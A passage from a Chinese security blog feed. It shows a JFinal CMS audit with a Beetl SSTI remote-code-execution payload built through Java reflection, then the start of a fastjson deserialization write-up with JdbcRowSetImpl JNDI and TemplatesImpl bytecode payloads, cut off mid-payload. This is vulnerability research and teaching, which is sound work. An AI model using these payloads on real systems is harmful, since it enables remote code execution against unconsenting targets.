class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>&emsp;&emsp; <code>model.update();</code>方法是更新数据，将信息写入数据库。具体实习方法可以下一部分代码。<br><img src="https://img-blog.csdnimg.cn/20200412175111793.png" alt="在这里插入图片描述"></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">model.update();</span><br><span class="line">UserCache.init(); <span class="comment">// 设置缓存</span></span><br><span class="line">SysUser newUser = SysUser.dao.findById(userid);</span><br><span class="line">setSessionUser(newUser); <span class="comment">// 设置session</span></span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">1</span>);<span class="comment">// 成功</span></span><br><span class="line"></span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>&emsp;&emsp; 首先方法会进行一个判断，然后创建一个sql语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">filter(FILTER_BY_UPDATE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_getModifyFlag().isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table table = _getTable();</span><br><span class="line">String[] pKeys = table.getPrimaryKey();</span><br><span class="line"><span class="keyword">for</span> (String pKey : pKeys) &#123;</span><br><span class="line">Object id = attrs.get(pKey);</span><br><span class="line"><span class="keyword">if</span> (id == <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(<span class="string">"You can't update model without Primary Key, "</span> + pKey + <span class="string">" can not be null."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Config config = _getConfig();</span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">List&lt;Object&gt; paras = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">config.dialect.forModelUpdate(table, attrs, _getModifyFlag(), sql, paras);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (paras.size() &lt;= <span class="number">1</span>) &#123;<span class="comment">// Needn't update</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 创建数据库连接，更新数据。    可以看到执行完这步就会更新数据库内容。（<code>利用MySQL语句监控，可以看到最下面的一条是执行的sql语句</code>）<br><img src="https://img-blog.csdnimg.cn/20200412175227291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200412175330982.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --------</span></span><br><span class="line">Connection conn = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">conn = config.getConnection();</span><br><span class="line"><span class="keyword">int</span> result = Db.update(config, conn, sql.toString(), paras.toArray());</span><br><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">_getModifyFlag().clear();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">config.close(conn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br></pre></td></tr></table></figure><hr><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li>我们可以看到整个数据更新的过程，我们没有看到任何的防护措施，过滤字符手段。</li></ol><hr><h1 id="SSTI模板注入漏洞"><a href="#SSTI模板注入漏洞" class="headerlink" title="SSTI模板注入漏洞"></a>SSTI模板注入漏洞</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; 感谢长亭科技大佬@Lilc耐心指导，这个漏洞也是这位大佬挖的，我只是漏洞复现并给大家分享一下笔者构造SSTI模板注入漏洞payload经验。</p><hr><p><img src="https://img-blog.csdnimg.cn/20200413194319697.gif" alt="在这里插入图片描述"><br>&emsp;&emsp; 漏洞存在的位置在管理员后台模板修改下，可以修改模板代码，插入恶意代码等操作。插入一段恶意代码可导致远程代码执行。</p><hr><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><img src="https://img-blog.csdnimg.cn/20200414163051378.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200414163122383.png" alt="在这里插入图片描述"></p><hr><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 点击保存页面的首先会进入到<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>然后判断请求方法，是POST方法会判断是upload还是saveFile，如果是saveFile方法会跳转到<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManager.java</code>中的saveFile方法。<br><img src="https://img-blog.csdnimg.cn/20200414163459783.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">saveFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        JSONObject array = <span class="keyword">new</span> JSONObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String content = <span class="keyword">this</span>.get.get(<span class="string">"content"</span>);</span><br><span class="line">            content = FileManagerUtils.decodeContent(content);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// before bakup</span></span><br><span class="line">            bakupFile(<span class="keyword">new</span> File(getRealFilePath()));</span><br><span class="line"></span><br><span class="line">            FileManagerUtils.writeString(getRealFilePath(), content);</span><br><span class="line">            array.put(<span class="string">"Path"</span>, <span class="keyword">this</span>.get.get(<span class="string">"path"</span>));</span><br><span class="line">            array.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">            array.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"JSONObject error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"JSONObject error"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"IOException error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"IOException error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 前期可以修改代码机制我们已经了解的很清楚了，没有做任何的防护措施。但这些远远达不到SSTI的要求。<code>判断一个系统或者CMS是否使用了任何一个模板引擎</code>，先有比较大众Java模板引擎有Velocity，Freemarker，而这款模板引擎是beetl，挖掘之间根本没有了解过。据查阅知道，这是一款国产的模板引擎。<a href="http://ibeetl.com/" target="_blank" rel="noopener">官方地址</a>，官网说有很多优势，感觉一般般，吹牛的水分比较大吧。在研究这个模板的时候，官方给<a href="http://ibeetl.com/guide/#/beetl/" target="_blank" rel="noopener">文档</a>真的很差，有些东西说的一知半解没有说清楚。<br><img src="https://img-blog.csdnimg.cn/20200414164508404.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200414165055321.png" alt="在这里插入图片描述"></p><hr><h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>&emsp;&emsp; 查阅官方文档，了解这款模板引擎调用Java方法和属性模式。<br><img src="https://img-blog.csdnimg.cn/20200414171840853.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 本文构造payload得有简单Java的反射机制基础。<a href="https://www.cnblogs.com/haha12/p/4724204.html" target="_blank" rel="noopener">推荐文章</a>，文章中用了一个简单案例再现了Java的反射。<a href="https://blog.csdn.net/SECURE2/article/details/81099574?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">推荐文章</a>,文章用很多解释是关于Java反射和类加载的知识内容。[新增]<a href="https://www.bilibili.com/video/BV1s4411U7x9?from=search&seid=13854513651556834308" target="_blank" rel="noopener">推荐视频</a><br>[video(video-hkteTk7M-1587384668444)(type-bilibili)(url-<a href="https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-【Java反射机制】不懂反射机制不配当java程序员?)]" target="_blank" rel="noopener">https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-【Java反射机制】不懂反射机制不配当java程序员?)]</a></p><h4 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h4><p>&emsp;&emsp; 这里笔者将payload拆解了，方便更好的解读一下payload。由于beetl模板引擎禁止了<code>java.lang.Runtime</code>和<code>java.lang.Process</code>，所以这里不能直接调用进程来达到远程代码执行的效果。这里采用Java反射机制来达到效果，当然也有其他的方法，比例写文件等。读者们可以自行尝试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>先忽视上面的payload，下面会一步步解答，最后完整的payload</strong><br><img src="https://img-blog.csdnimg.cn/2020041418081219.png" alt="在这里插入图片描述"></p><ol><li>我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>的形式，然后payload就变成下面这样子了。<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>最终payload就变成了下面这样子。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 遇到使用了模板的解析CMS可以根据模板解析语言尝试执行命令，若遇到函数警用的情况可以尝试一些Bypass方法，比例一些反射、反序列化、字节码修改等。SSTI注入难的其实如何构造Payload，构造好了之后一切自然而然了。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7" target="_blank" rel="noopener">http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 学了一两个月的Java代码审计，对一些审计有了一定了解了。所以决定审计一下JavaWeb CMS，随便申请一下CV
      
    
    </summary>
    
    
    
      <category term="Java 文件上传" scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习fastjson反序列化始</title>
    <link href="https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/"/>
    <id>https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/</id>
    <published>2020-07-23T00:22:16.000Z</published>
    <updated>2020-07-29T06:03:12.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化漏洞文章。笔者在此以一种全新角度从分析payload构造角度出发，逆向学习分析fastjson反序列化漏洞始末。<br>ps：漏洞学习环境以代码均在上传<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">Github项目</a>。</p><hr><h1 id="初窥Payload"><a href="#初窥Payload" class="headerlink" title="初窥Payload"></a>初窥Payload</h1><p>&emsp;&emsp; 下面是一段最简单<code>Fastjson的版本号反序列化--URLDNS</code>代码，观察发现可以提出一个问题<code>@type</code>作用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// dnslog平台网站：http://www.dnslog.cn/</span></span><br><span class="line">        String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">                <span class="string">":\"http://h2a6yj.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="type的作用"><a href="#type的作用" class="headerlink" title="@type的作用"></a>@type的作用</h2><p>&emsp;&emsp; 下面是一段实验代码，帮助理解分析<code>@type</code>的由来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="comment">//TODO 修改pom.xml中的fastjson &lt;= 1.2.24</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setName(<span class="string">"summer"</span>);</span><br><span class="line">        String str1 = JSONObject.toJSONString(user);</span><br><span class="line">        <span class="comment">// 转化的时候加入一个序列化的特征 写入类名</span></span><br><span class="line">        <span class="comment">// feature = 特征</span></span><br><span class="line">        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="comment">// str2输入结果会输出 @type+类名</span></span><br><span class="line">        <span class="comment">// 由此可知@type是用于解析JSON时的用于指定类</span></span><br><span class="line">        System.out.println(str1);</span><br><span class="line">        System.out.println(str2);</span><br><span class="line">        <span class="comment">//如果fastjson解析内容时没有配置，会默认使用缺省配置</span></span><br><span class="line">        <span class="comment">// TODO 查看parse方法 可以设置断点看看不同之处和相同之处</span></span><br><span class="line">        Object parse1 = JSON.parse(str1);</span><br><span class="line">        Object parse2 = JSON.parse(str2);</span><br><span class="line">        <span class="comment">//很明显的结果不一样</span></span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str1's parse1: "</span> + parse1);</span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str2's parse2: "</span> + parse2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142150824.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 对比分析一下，只要在JSON序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。再将带有<code>@type</code>字段的序列化数据进行反序列化会得到对应的实例类对象。反序列化可以获取类对象？有Java基础的安全人应该会敏感的这里十之八九存在漏洞。<br>ps： 下面是一段验证代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Vuldemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"vul.fastjson.User\",\"age\":18,\"name\":\"summer\"&#125;"</span>;</span><br><span class="line">        Object ob = JSON.parse(payload);</span><br><span class="line">System.out.println(<span class="string">"反序列化后类对象:  "</span> + ob.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"反序列化结果: "</span> + ob);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142644574.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="RCE’s-payload"><a href="#RCE’s-payload" class="headerlink" title="RCE’s payload"></a>RCE’s payload</h2><p>&emsp;&emsp; 第一种payload是使用<code>com.sun.rowset.JdbcRowSetImpl</code>类，第二种是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。第二种之前在<a href="https://samny.blog.csdn.net/article/details/106160182" target="_blank" rel="noopener">漫谈Commons-Collections反序列化</a>讨论分析过，这里不再重复着重讨论分析第一种payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://127.0.0.1:1090/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span 